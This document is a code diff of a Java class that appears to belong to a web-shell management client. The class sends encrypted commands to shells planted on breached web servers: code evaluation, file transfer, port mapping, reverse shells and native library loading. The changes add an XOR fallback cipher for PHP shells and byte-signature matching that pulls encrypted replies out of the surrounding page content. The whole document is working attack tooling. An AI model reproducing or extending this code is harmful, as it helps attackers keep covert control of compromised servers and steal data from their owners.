@@ -36,8 +36,11 @@ public class ShellService implements IShellService {
    public Map currentHeaders;
    public Map scriptHeaders;
    public int encryptType;
+   private int compareMode;
    public int beginIndex;
    public int endIndex;
+   public byte[] prefixBytes;
+   public byte[] suffixBytes;
    public JSONObject shellEntity;
    public static int BUFFSIZE = 46080;
    public static Map currentProxy;
@@ -67,18 +70,20 @@ public class ShellService implements IShellService {
    }
 
    private ICrypt getCryptor(int transProtocolId) {
-      Object cryptor = null;
-
-      try {
-         cryptor = new CustomCryptor(transProtocolId, Utils.getKey("rebeyond"));
-      } catch (Exception var5) {
-         var5.printStackTrace();
-         cryptor = new AESCryptor();
-      }
-
-      try {
-         byte[] var3 = ((ICrypt)cryptor).getDecodeClsBytes();
-      } catch (Exception var4) {
+      ICrypt cryptor = null;
+      if (transProtocolId >= 0) {
+         try {
+            cryptor = new CustomCryptor(transProtocolId, Utils.getKey("rebeyond"));
+            ((ICrypt)cryptor).getDecodeClsBytes();
+         } catch (Exception var5) {
+            var5.printStackTrace();
+         }
+      } else {
+         try {
+            cryptor = new LegacyCryptor(this.effectType, this.encryptType, this.currentKey);
+         } catch (Exception var4) {
+            var4.printStackTrace();
+         }
       }
 
       return (ICrypt)cryptor;
@@ -93,6 +98,7 @@ public class ShellService implements IShellService {
 
    public ShellService(JSONObject shellEntity) throws Exception {
       this.encryptType = Constants.ENCRYPT_TYPE_AES;
+      this.compareMode = 0;
       this.beginIndex = 0;
       this.endIndex = 0;
       this.needTransfer = false;
@@ -102,6 +108,7 @@ public class ShellService implements IShellService {
       this.currentUrl = shellEntity.getString("url");
       this.currentType = shellEntity.getString("type");
       this.currentPassword = shellEntity.getString("password");
+      this.currentKey = Utils.getKey(this.currentPassword);
       this.currentHeaders = new HashMap();
       this.effectType = this.currentType;
       this.cryptor = this.getCryptor(shellEntity.getInt("transProtocolId"));
@@ -119,6 +126,7 @@ public class ShellService implements IShellService {
 
    public ShellService(JSONObject shellEntity, List childList) throws Exception {
       this.encryptType = Constants.ENCRYPT_TYPE_AES;
+      this.compareMode = 0;
       this.beginIndex = 0;
       this.endIndex = 0;
       this.needTransfer = false;
@@ -304,7 +312,20 @@ public class ShellService implements IShellService {
       boolean result = false;
       int randStringLength = (new SecureRandom()).nextInt(3000);
       String content = Utils.getRandomString(randStringLength);
-      JSONObject obj = this.echo(content);
+      JSONObject obj = null;
+
+      try {
+         obj = this.echo(content);
+      } catch (DecryptException var6) {
+         if (!this.effectType.equals("php") || this.cryptor.isCustomized()) {
+            throw var6;
+         }
+
+         this.encryptType = Constants.ENCRYPT_TYPE_XOR;
+         this.cryptor = this.getCryptor(-1);
+         obj = this.echo(content);
+      }
+
       if (obj.getString("msg").equals(content)) {
          result = true;
       }
@@ -323,7 +344,7 @@ public class ShellService implements IShellService {
 
       byte[] data = Utils.getEvalDataWithTransprotocol(this.cryptor, this.currentKey, this.effectType, payload);
       Map resultObj = this.doRequestAndParse(data);
-      byte[] resData = (byte[])((byte[])resultObj.get("data"));
+      byte[] resData = (byte[])resultObj.get("data");
       result = new String(resData);
       Map params = new HashMap();
       params.put("sourceCode", sourceCode);
@@ -344,9 +365,9 @@ public class ShellService implements IShellService {
          payload = sourceCode.getBytes();
       }
 
-      byte[] data = Utils.getEvalData(this.cryptor, this.currentKey, this.effectType, payload);
+      byte[] data = Utils.getEvalData(this.cryptor, this.effectType, payload);
       Map resultObj = this.doRequestAndParse(data);
-      byte[] resData = (byte[])((byte[])resultObj.get("data"));
+      byte[] resData = (byte[])resultObj.get("data");
       result = new String(resData);
       Map params = new HashMap();
       params.put("sourceCode", sourceCode);
@@ -371,8 +392,8 @@ public class ShellService implements IShellService {
       params.put("action", "create");
       params.put("target", target);
       byte[] data = Utils.getData(this.currentKey, this.encryptType, "BShell", params, this.currentType);
-      Map resultObj = Utils.requestAndParse(this.currentUrl, this.currentHeaders, data, this.beginIndex, this.endIndex);
-      byte[] resData = (byte[])((byte[])resultObj.get("data"));
+      Map resultObj = Utils.requestAndParse(this.currentUrl, this.currentHeaders, data, this.compareMode, this.beginIndex, this.endIndex, this.prefixBytes, this.suffixBytes);
+      byte[] resData = (byte[])resultObj.get("data");
       String resultTxt = new String(Crypt.Decrypt(resData, this.currentKey, this.encryptType, this.currentType));
       resultTxt = new String(resultTxt.getBytes("UTF-8"), "UTF-8");
       JSONObject result = new JSONObject(resultTxt);
@@ -431,19 +452,7 @@ public class ShellService implements IShellService {
       params.put("action", action);
       params.put("target", target);
       params.put("params", actionParams);
-      byte[] data = Utils.getData(this.currentKey, this.encryptType, "BShell", params, this.currentType);
-      Map resultObj = Utils.requestAndParse(this.currentUrl, this.currentHeaders, data, this.beginIndex, this.endIndex);
-      byte[] resData = (byte[])((byte[])resultObj.get("data"));
-      String resultTxt = new String(Crypt.Decrypt(resData, this.currentKey, this.encryptType, this.currentType));
-      resultTxt = new String(resultTxt.getBytes("UTF-8"), "UTF-8");
-      JSONObject result = new JSONObject(resultTxt);
-      Iterator var10 = result.keySet().iterator();
-
-      while(var10.hasNext()) {
-         String key = (String)var10.next();
-         result.put(key, new String(Base64.getDecoder().decode(result.getString(key)), "UTF-8"));
-      }
-
+      JSONObject result = this.parseCommonAction("BShell", params);
       return result;
    }
 
@@ -713,11 +722,12 @@ public class ShellService implements IShellService {
    }
 
    public void downloadFile(String remotePath, String localPath) throws Exception {
+      byte[] fileContent = null;
       Map params = new LinkedHashMap();
       params.put("mode", "download");
       params.put("path", remotePath);
       byte[] data = Utils.getData(this.currentKey, this.encryptType, "FileOperation", params, this.currentType);
-      byte[] fileContent = (byte[])((byte[])Utils.sendPostRequestBinary(this.currentUrl, this.currentHeaders, data).get("data"));
+      fileContent = (byte[])Utils.sendPostRequestBinary(this.currentUrl, this.currentHeaders, data).get("data");
       FileOutputStream fso = new FileOutputStream(localPath);
       fso.write(fileContent);
       fso.flush();
@@ -759,8 +769,8 @@ public class ShellService implements IShellService {
             params.put("path", remotePath);
             params.put("content", Base64.getEncoder().encodeToString((byte[])blocks.get(i)));
             byte[] data = Utils.getData(this.cryptor, "FileOperation", params, this.currentType);
-            Map resultObj = Utils.requestAndParse(this.currentUrl, this.currentHeaders, data, this.beginIndex, this.endIndex);
-            byte[] resData = (byte[])((byte[])resultObj.get("data"));
+            Map resultObj = Utils.requestAndParse(this.currentUrl, this.currentHeaders, data, this.compareMode, this.beginIndex, this.endIndex, this.prefixBytes, this.suffixBytes);
+            byte[] resData = (byte[])resultObj.get("data");
             String resultTxt = new String(this.cryptor.decrypt(resData));
             result = new JSONObject(resultTxt);
             Iterator var12 = result.keySet().iterator();
@@ -781,8 +791,8 @@ public class ShellService implements IShellService {
       params.put("path", remotePath);
       params.put("content", Base64.getEncoder().encodeToString(fileContent));
       byte[] data = Utils.getData(this.cryptor, "FileOperation", params, this.currentType);
-      Map resultObj = Utils.requestAndParse(this.currentUrl, this.currentHeaders, data, this.beginIndex, this.endIndex);
-      byte[] resData = (byte[])((byte[])resultObj.get("data"));
+      Map resultObj = Utils.requestAndParse(this.currentUrl, this.currentHeaders, data, this.compareMode, this.beginIndex, this.endIndex, this.prefixBytes, this.suffixBytes);
+      byte[] resData = (byte[])resultObj.get("data");
       String resultTxt = new String(this.cryptor.decrypt(resData));
       JSONObject result = new JSONObject(resultTxt);
       Iterator var9 = result.keySet().iterator();
@@ -801,8 +811,8 @@ public class ShellService implements IShellService {
       params.put("path", remotePath);
       params.put("content", Base64.getEncoder().encodeToString(fileContent));
       byte[] data = Utils.getData(this.cryptor, "FileOperation", params, this.currentType);
-      Map resultObj = Utils.requestAndParse(this.currentUrl, this.currentHeaders, data, this.beginIndex, this.endIndex);
-      byte[] resData = (byte[])((byte[])resultObj.get("data"));
+      Map resultObj = Utils.requestAndParse(this.currentUrl, this.currentHeaders, data, this.compareMode, this.beginIndex, this.endIndex, this.prefixBytes, this.suffixBytes);
+      byte[] resData = (byte[])resultObj.get("data");
       String resultTxt = new String(this.cryptor.decrypt(resData));
       JSONObject result = new JSONObject(resultTxt);
       Iterator var9 = result.keySet().iterator();
@@ -1007,8 +1017,8 @@ public class ShellService implements IShellService {
       params.put("targetIP", targetIP);
       params.put("targetPort", targetPort);
       byte[] data = Utils.getData(this.cryptor, "PortMap", params, this.currentType);
-      Map resultObj = Utils.requestAndParse(this.currentUrl, this.currentHeaders, data, this.beginIndex, this.endIndex);
-      byte[] resData = (byte[])((byte[])resultObj.get("data"));
+      Map resultObj = Utils.requestAndParse(this.currentUrl, this.currentHeaders, data, this.compareMode, this.beginIndex, this.endIndex, this.prefixBytes, this.suffixBytes);
+      byte[] resData = (byte[])resultObj.get("data");
       String resultTxt = new String(this.cryptor.decrypt(resData));
       JSONObject result = new JSONObject(resultTxt);
       return result;
@@ -1019,7 +1029,7 @@ public class ShellService implements IShellService {
       params.put("action", "closeLocalWorker");
       params.put("socketHash", socketHash);
       byte[] data = Utils.getData(this.cryptor, "PortMap", params, this.currentType);
-      Map resHeader = (Map)Utils.requestAndParse(this.currentUrl, this.currentHeaders, data, this.beginIndex, this.endIndex).get("header");
+      Map resHeader = (Map)Utils.requestAndParse(this.currentUrl, this.currentHeaders, data, this.compareMode, this.beginIndex, this.endIndex, this.prefixBytes, this.suffixBytes).get("header");
       return ((String)resHeader.get("status")).equals("200");
    }
 
@@ -1092,11 +1102,26 @@ public class ShellService implements IShellService {
       return result;
    }
 
+   private void initBodySignature(byte[] resData, int beginIndex, int endIndex) {
+      if (beginIndex != -1 && endIndex != -1) {
+         int head = beginIndex - 20;
+         head = head > 0 ? head : 0;
+         this.prefixBytes = Arrays.copyOfRange(resData, head, beginIndex);
+         int tail = resData.length - endIndex;
+         tail = tail > 20 ? 20 : tail;
+         this.suffixBytes = Arrays.copyOfRange(resData, resData.length - endIndex, resData.length - endIndex + tail);
+         if (Utils.indexOf(resData, this.prefixBytes) != head || Utils.indexOf(resData, this.suffixBytes) != resData.length - endIndex) {
+            this.prefixBytes = null;
+            this.suffixBytes = null;
+         }
+
+      }
+   }
+
    public JSONObject echo(String content) throws Exception {
       Map params = new LinkedHashMap();
       params.put("content", content);
       byte[] data = Utils.getData(this.cryptor, "Echo", params, this.effectType);
-      this.currentHeaders.put("Accept-Encoding", "identity");
       Map resultObj = this.doRequestAndParse(data);
       Map responseHeader = (Map)resultObj.get("header");
       JSONObject expectedSuccessObj = new JSONObject();
@@ -1105,10 +1130,13 @@ public class ShellService implements IShellService {
       String expectedSuccessBody = expectedSuccessObj.toString();
       expectedSuccessBody = String.format("{\"status\":\"%s\",\"msg\":\"%s\"}", Base64.getEncoder().encodeToString("success".getBytes()), Base64.getEncoder().encodeToString(content.getBytes()));
       byte[] expectedSuccessBodyBytes = this.cryptor.encrypt(expectedSuccessBody.getBytes());
-      byte[] resData = (byte[])((byte[])resultObj.get("data"));
+      byte[] resData = (byte[])resultObj.get("data");
       this.beginIndex = Utils.indexOf(resData, expectedSuccessBodyBytes);
       this.endIndex = resData.length - (this.beginIndex + expectedSuccessBodyBytes.length);
-      if (this.beginIndex > 0) {
+      this.endIndex = this.beginIndex == -1 ? -1 : this.endIndex;
+      if (this.beginIndex > 0 || this.endIndex > 0) {
+         this.compareMode = Constants.COMPARE_MODE_NUM;
+         this.initBodySignature(resData, this.beginIndex, this.endIndex);
          resData = Arrays.copyOfRange(resData, this.beginIndex, resData.length - this.endIndex);
       }
 
@@ -1118,15 +1146,9 @@ public class ShellService implements IShellService {
          if (this.effectType.equals("native")) {
             resultTxt = new String(this.cryptor.decryptCompatible(resData));
          } else {
-            if (this.effectType.equals("asp")) {
-               String temp = new String(resData, "UTF-16LE");
-               resData = temp.getBytes();
-            }
-
             resultTxt = new String(this.cryptor.decrypt(resData));
          }
       } catch (InvocationTargetException var15) {
-         var15.printStackTrace();
          if (var15.getTargetException() instanceof IllegalBlockSizeException) {
             throw new DecryptException((String)responseHeader.get("status"), new String(resData));
          }
@@ -1207,8 +1229,8 @@ public class ShellService implements IShellService {
       params.put("whatever", Utils.getWhatever());
       params.put("libraryPath", libraryPath);
       byte[] data = Utils.getData(this.currentKey, this.encryptType, "LoadNativeLibrary", params, this.currentType);
-      Map resultObj = Utils.requestAndParse(this.currentUrl, this.currentHeaders, data, this.beginIndex, this.endIndex);
-      byte[] resData = (byte[])((byte[])resultObj.get("data"));
+      Map resultObj = Utils.requestAndParse(this.currentUrl, this.currentHeaders, data, this.compareMode, this.beginIndex, this.endIndex, this.prefixBytes, this.suffixBytes);
+      byte[] resData = (byte[])resultObj.get("data");
       String resultTxt = new String(Crypt.Decrypt(resData, this.currentKey, this.encryptType, this.currentType));
       JSONObject result = new JSONObject(resultTxt);
       Iterator var8 = result.keySet().iterator();
@@ -1378,13 +1400,13 @@ public class ShellService implements IShellService {
    }
 
    public Map transferPayload(byte[] payloadBody) throws Exception {
-      Map resultObj = Utils.requestAndParse(this.currentUrl, this.currentHeaders, payloadBody, this.beginIndex, this.endIndex);
+      Map resultObj = Utils.requestAndParse(this.currentUrl, this.currentHeaders, payloadBody, this.compareMode, this.beginIndex, this.endIndex, this.prefixBytes, this.suffixBytes);
       return resultObj;
    }
 
    private Map doRequestAndParse(byte[] data) throws Exception {
       if (!this.needTransfer) {
-         return Utils.requestAndParse(this.currentUrl, this.currentHeaders, data, this.beginIndex, this.endIndex);
+         return Utils.requestAndParse(this.currentUrl, this.currentHeaders, data, this.compareMode, this.beginIndex, this.endIndex, this.prefixBytes, this.suffixBytes);
       } else {
          for(int i = this.childList.size() - 1; i >= 0; --i) {
             String scriptType = ((JSONObject)this.shellChains.get(i)).getString("type");
@@ -1440,17 +1462,20 @@ public class ShellService implements IShellService {
 
       byte[] data = Utils.getData(this.cryptor, payloadName, params, this.effectType);
       Map resultObj = this.doRequestAndParse(data);
-      byte[] resData = (byte[])((byte[])resultObj.get("data"));
+      byte[] resData = (byte[])resultObj.get("data");
+      resData = extractPayload(resData, this.compareMode, this.beginIndex, this.endIndex, this.prefixBytes, this.suffixBytes);
       String resultTxt;
       if (this.effectType.equals("native")) {
          resultTxt = new String(this.cryptor.decryptCompatible(resData));
       } else {
-         if (this.effectType.equals("asp")) {
-            String temp = new String(resData, "UTF-16LE");
-            resData = temp.getBytes();
+         try {
+            resultTxt = new String(this.cryptor.decrypt(resData));
+         } catch (InvocationTargetException var10) {
+            this.compareMode = Constants.COMPARE_MODE_BYTES;
+            resData = (byte[])resultObj.get("data");
+            resData = extractPayload(resData, this.compareMode, this.beginIndex, this.endIndex, this.prefixBytes, this.suffixBytes);
+            resultTxt = new String(this.cryptor.decrypt(resData));
          }
-
-         resultTxt = new String(this.cryptor.decrypt(resData));
       }
 
       JSONObject result = new JSONObject(resultTxt);
@@ -1462,5 +1487,25 @@ public class ShellService implements IShellService {
       }
 
       return result;
+   }
+
+   public void setCompareMode(int compareMode) {
+      this.compareMode = compareMode;
+   }
+
+   private static byte[] extractPayload(byte[] resData, int compareMode, int beginIndex, int endIndex, byte[] prefixBytes, byte[] suffixBytes) {
+      if (compareMode == Constants.COMPARE_MODE_NUM) {
+         if (resData.length - endIndex >= beginIndex) {
+            resData = Arrays.copyOfRange(resData, beginIndex, resData.length - endIndex);
+         }
+      } else if (compareMode == Constants.COMPARE_MODE_BYTES) {
+         beginIndex = Utils.indexOf(resData, prefixBytes) + prefixBytes.length;
+         endIndex = resData.length - Utils.indexOf(resData, suffixBytes);
+         if (resData.length - endIndex >= beginIndex) {
+            resData = Arrays.copyOfRange(resData, beginIndex, resData.length - endIndex);
+         }
+      }
+
+      return resData;
    }
 }
